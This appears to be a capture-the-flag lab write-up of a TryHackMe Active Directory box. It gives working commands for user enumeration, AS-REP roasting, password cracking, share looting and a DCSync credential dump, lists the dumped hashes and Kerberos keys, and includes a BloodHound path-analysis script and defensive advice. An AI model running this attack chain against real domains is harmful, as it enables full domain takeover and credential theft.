# 🕵️ DomainSleuth — Active Directory Attack Path Analyzer


**DomainSleuth** is a hands-on Active Directory attack path analysis project.

It demonstrates how a **single misconfigured account** can be chained with other weaknesses to achieve **complete domain takeover** — from initial reconnaissance all the way to dumping every domain credential.

**What this project covers:**
- Network and user enumeration
- AS-REP Roasting attack
- Password cracking
- SMB lateral movement and credential harvesting
- DCSync privilege escalation
- BloodHound data collection
- Automated attack path analysis using graph theory (NetworkX)

---

## 🧪 Lab Environment

| Field | Value |
|---|---|
| Target IP | `10.49.181.77` |
| Domain | `spookysec.local` |
| DC Hostname | `AttacktiveDirectory.spookysec.local` |
| OS | Windows Server 2019 (Build 17763) |
| Platform | TryHackMe — Attacktive Directory |

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port scanning and service fingerprinting |
| `enum4linux` | SMB/LDAP enumeration |
| `kerbrute` | Kerberos username enumeration |
| `impacket-GetNPUsers` | AS-REP Roasting |
| `john` | Password cracking |
| `nxc` (NetExec) | SMB share access and BloodHound collection |
| `smbclient` | SMB share interaction |
| `impacket-secretsdump` | DCSync / NTDS.DIT credential dump |
| `networkx` (Python) | Graph-based attack path analysis |

---

## 🔍 Step 1 — Network Enumeration

```bash
nmap -sC -sV 10.49.181.77
```

**Key ports discovered:**

| Port | Service | Significance |
|---|---|---|
| 53 | DNS | Domain controller confirmed |
| 88 | Kerberos | Enables AS-REP Roasting |
| 389 / 3268 | LDAP | Active Directory queries |
| 445 | SMB | Lateral movement vector |
| 3389 | RDP | Remote access |
| 5985 | WinRM | PowerShell remoting |

**What this tells us:**  
All classic signs of a Domain Controller. Kerberos on 88 immediately signals potential for AS-REP Roasting. SMB on 445 with signing enabled is noted — no SMB relay possible, but share access is still viable.

---

## 👤 Step 2 — User Enumeration (Kerbrute)

Kerbrute sends AS-REQ messages to Kerberos and detects valid usernames based on the error response — without triggering account lockout.

```bash
kerbrute userenum --dc 10.49.181.77 -d spookysec.local userlist.txt
```

**Valid users discovered:**

```
james@spookysec.local
svc-admin@spookysec.local
robin@spookysec.local
darkstar@spookysec.local
administrator@spookysec.local
backup@spookysec.local
paradox@spookysec.local
ori@spookysec.local
```

A `valid_users.txt` file was created from these results for the next stage.

---

## 🔐 Step 3 — AS-REP Roasting

AS-REP Roasting targets accounts with **Kerberos pre-authentication disabled** (`UF_DONT_REQUIRE_PREAUTH`). When pre-auth is off, the KDC responds with an AS-REP ticket encrypted with the user's password hash — no valid credentials needed to request it.

```bash
impacket-GetNPUsers spookysec.local/ \
  -usersfile valid_users.txt \
  -format hashcat \
  -outputfile hashes.txt \
  -dc-ip 10.49.181.77
```

**Result:** `svc-admin` had pre-authentication disabled.

```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:<hash>
```

### Password Cracking

```bash
john --wordlist=rockyou.txt hashes.txt
```

```
svc-admin : management2005
```

**⚠️ Vulnerability:** Kerberos pre-authentication disabled on a service account + weak password in common wordlist.

---

## 🔄 Step 4 — SMB Lateral Movement

With `svc-admin` credentials, enumerate accessible SMB shares:

```bash
nxc smb 10.49.181.77 -u svc-admin -p management2005 --shares
```

**Shares available:**

| Share | Access |
|---|---|
| ADMIN$ | None |
| backup | **READ** |
| C$ | None |
| IPC$ | READ |
| NETLOGON | READ |
| SYSVOL | READ |

### Accessing the Backup Share

```bash
smbclient //10.49.181.77/backup -U svc-admin
```

```
smb: \> ls
  backup_credentials.txt    A    48
  
smb: \> get backup_credentials.txt
```

### Decoding the Credentials

```bash
cat backup_credentials.txt
# YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
# backup@spookysec.local:backup2517860
```

**⚠️ Vulnerability:** Credentials stored in plaintext in a world-readable SMB share, only Base64 encoded (not encrypted).

---

## 👑 Step 5 — DCSync Privilege Escalation

The `backup` account was found to hold **Replicating Directory Changes** and **Replicating Directory Changes All** privileges — the exact permissions needed to perform a DCSync attack.

DCSync mimics the behavior of a Domain Controller replication request (DRSUAPI), tricking the real DC into sending all password hashes.

```bash
impacket-secretsdump spookysec.local/backup:backup2517860@10.49.181.77
```

**All domain hashes dumped:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:d14969cac3635528d6a185fe0d7aff20:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:768138a44054d9dcdfdc6c9b3644fbb65a132b969d22ed9774050b974bc89b3b
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:5155b7dce80b546420f88825995d0c58
ATTACKTIVEDIREC$:des-cbc-md5:6b2f1c0ed0a740ef
```

Administrator NT hash: `0e0363213e37b94221497260b0bcb4fc`  
This hash can be used directly for Pass-the-Hash attacks — no password cracking needed.

**⚠️ Vulnerability:** Non-admin service account (`backup`) granted DCSync privileges — a catastrophic misconfiguration.

---

## 🔗 Full Attack Chain

```
[Initial Access]
    kerbrute → discover valid usernames
        ↓
[AS-REP Roasting]
    svc-admin has pre-auth disabled
    → hash captured → cracked → management2005
        ↓
[Lateral Movement]
    SMB access to \\ATTACKTIVEDIREC\backup
    → backup_credentials.txt extracted
    → Base64 decoded → backup:backup2517860
        ↓
[Privilege Escalation]
    backup account has DCSync rights
    → impacket-secretsdump → all NTDS.DIT hashes
        ↓
[Domain Compromise]
    Administrator hash → Pass-the-Hash
    → Full domain control
```

---

## 🧠 Step 6 — Automated Attack Path Analysis (PathFinder.py)

After collecting BloodHound data via NXC:

```bash
nxc ldap 10.49.181.77 -u svc-admin -p management2005 -d spookysec.local --bloodhound --collection All
```
Output
```bash
LDAP        10.49.181.77    389    ATTACKTIVEDIRECTORY [*] Windows 10 / Server 2019 Build 17763 (name:ATTACKTIVEDIRECTORY) (domain:spookysec.local) (signing:None) (channel binding:No TLS cert)
LDAP        10.49.181.77    389    ATTACKTIVEDIRECTORY [+] spookysec.local\svc-admin:management2005
LDAP        10.49.181.77    389    ATTACKTIVEDIRECTORY [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
LDAP        10.49.181.77    389    ATTACKTIVEDIRECTORY Resolved collection methods: localadmin, rdp, session, objectprops, group, trusts, acl, container, psremote, dcom
LDAP        10.49.181.77    389    ATTACKTIVEDIRECTORY Done in 0M 4S
LDAP        10.49.181.77    389    ATTACKTIVEDIRECTORY Compressing output into /home/noregret/.nxc/logs/ATTACKTIVEDIRECTORY_10.49.181.77_2026-04-24_023746_bloodhound.zip
```

The JSON output was parsed by a custom Python tool using **NetworkX** (directed graph analysis) to automatically identify shortest paths from any user to Domain Admin.

### PathFinder.py

```python
import json, os, glob
import networkx as nx

INPUT_FOLDER = "input"
OUTPUT_FOLDER = "output"

class PathFinder:
    def __init__(self):
        self.graph = nx.DiGraph()
        self.da_group_sid = None

    def load_data(self):
        # Load group memberships → find Domain Admins SID
        groups_data = self._read_json("groups")
        for group in groups_data:
            name = group.get("Properties", {}).get("name", "")
            sid = group.get("ObjectIdentifier")
            if "DOMAIN ADMINS" in name.upper():
                self.da_group_sid = sid
                print(f"[+] Found Domain Admins Group: {name} ({sid})")
            for member in group.get("Members", []):
                m_sid = member.get("ObjectIdentifier") if isinstance(member, dict) else member
                self.graph.add_edge(m_sid, sid, label="MemberOf")

        # Load users + ACL-based edges
        for user in self._read_json("users"):
            u_sid = user.get("ObjectIdentifier")
            u_name = user.get("Properties", {}).get("name", "Unknown")
            self.graph.add_node(u_sid, name=u_name, type="User")
            for ace in user.get("Aces", []):
                target = ace.get("PrincipalSID")
                right = ace.get("RightName")
                if right in ["GenericAll", "GenericWrite", "Owns", "WriteDacl", "WriteOwner"]:
                    self.graph.add_edge(target, u_sid, label=right)

        # Load computers + session-based lateral movement
        for comp in self._read_json("computers"):
            c_sid = comp.get("ObjectIdentifier")
            c_name = comp.get("Properties", {}).get("name", "Unknown")
            self.graph.add_node(c_sid, name=c_name, type="Computer")
            for session in comp.get("Sessions", []):
                user_sid = session.get("UserSID") if isinstance(session, dict) else session
                if user_sid:
                    self.graph.add_edge(c_sid, user_sid, label="HasSession")

    def _read_json(self, file_type):
        pattern = os.path.join(INPUT_FOLDER, f"*{file_type}.json")
        files = glob.glob(pattern)
        if not files:
            return []
        with open(files[0], 'r', encoding='utf-8-sig') as f:
            return json.load(f).get("data", [])

    def analyze_paths(self):
        results = []
        users = [n for n, d in self.graph.nodes(data=True) if d.get("type") == "User"]
        for start_node in users:
            try:
                path = nx.shortest_path(self.graph, source=start_node, target=self.da_group_sid)
                if len(path) > 1:
                    results.append({
                        "source": self.graph.nodes[start_node].get("name", "Unknown"),
                        "hops": len(path) - 1,
                        "attack_story": self.generate_narrative(path)
                    })
            except (nx.NetworkXNoPath, KeyError):
                continue
        return results

    def generate_narrative(self, path):
        story = []
        for i in range(len(path) - 1):
            u, v = path[i], path[i+1]
            u_name = self.graph.nodes[u].get("name", u)
            v_name = self.graph.nodes[v].get("name", v)
            relation = self.graph.get_edge_data(u, v).get("label", "controls")
            if relation == "MemberOf":
                story.append(f"{u_name} is a member of {v_name}.")
            elif relation == "HasSession":
                story.append(f"An attacker on {u_name} can hijack the session of {v_name}.")
            else:
                story.append(f"{u_name} has {relation} rights over {v_name}.")
        return " ".join(story)

def main():
    os.makedirs(OUTPUT_FOLDER, exist_ok=True)
    engine = PathFinder()
    engine.load_data()
    paths = engine.analyze_paths()
    with open(os.path.join(OUTPUT_FOLDER, "attack_paths.json"), 'w') as f:
        json.dump(paths, f, indent=4)
    print(f"[+] Analysis Complete! {len(paths)} paths found.")

if __name__ == "__main__":
    main()
```

### Running PathFinder

```bash
python3 -m venv venv
source venv/bin/activate
pip install networkx
python3 PathFinder.py
```

### Output

```json
[
  {
    "source": "ADMINISTRATOR@SPOOKYSEC.LOCAL",
    "hops": 1,
    "attack_story": "ADMINISTRATOR@SPOOKYSEC.LOCAL is a member of Domain Admins."
  },
  {
    "source": "A-SPOOKS@SPOOKYSEC.LOCAL",
    "hops": 1,
    "attack_story": "A-SPOOKS@SPOOKYSEC.LOCAL is a member of Domain Admins."
  }
]
```

PathFinder automatically confirmed that `a-spooks` also has a direct path to Domain Admin — something easy to miss in manual analysis.



## 🧩 MITRE ATT&CK Mapping

| Technique | ID | Description |
|---|---|---|
| AS-REP Roasting | T1558.004 | Stolen or Forged Kerberos Tickets |
| SMB/Windows Admin Shares | T1021.002 | Lateral Movement via SMB |
| OS Credential Dumping: DCSync | T1003.006 | Domain Controller credential sync |
| Valid Accounts | T1078 | Using legitimate credentials |
| Unsecured Credentials | T1552 | Credentials in plaintext file |

---

## 🔑 Key Findings Summary

| Finding | Severity | Impact |
|---|---|---|
| Kerberos pre-auth disabled on `svc-admin` | High | AS-REP hash captured and cracked |
| Weak password (`management2005`) | High | In rockyou.txt — cracked in seconds |
| Plaintext credentials in SMB share | Critical | `backup` account exposed |
| `backup` granted DCSync privileges | Critical | Full domain credential dump |
| `a-spooks` is Domain Admin member | High | Hidden admin path discovered |

---

## 💡 Defensive Recommendations

1. **Enable Kerberos pre-authentication** on all accounts — disable `UF_DONT_REQUIRE_PREAUTH` unless explicitly required.
2. **Enforce strong password policies** — minimum 12 characters, complexity requirements, block common passwords.
3. **Audit SMB share permissions** — never store credentials in accessible shares, even encoded.
4. **Restrict DCSync rights** — only Domain Controllers should hold `Replicating Directory Changes` privileges. Audit with: `Get-ObjectAcl -DistinguishedName "DC=spookysec,DC=local" -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "DS-Replication"}`.
5. **Run BloodHound regularly** — proactively identify attack paths before attackers do.
6. **Enable Protected Users security group** for privileged accounts to prevent Kerberos delegation abuse.

---
---

## ⚖️ Legal Disclaimer

This project was conducted in a controlled lab environment (TryHackMe). All techniques demonstrated are for **educational purposes only**. Do not use these methods against systems you do not own or have explicit written permission to test.

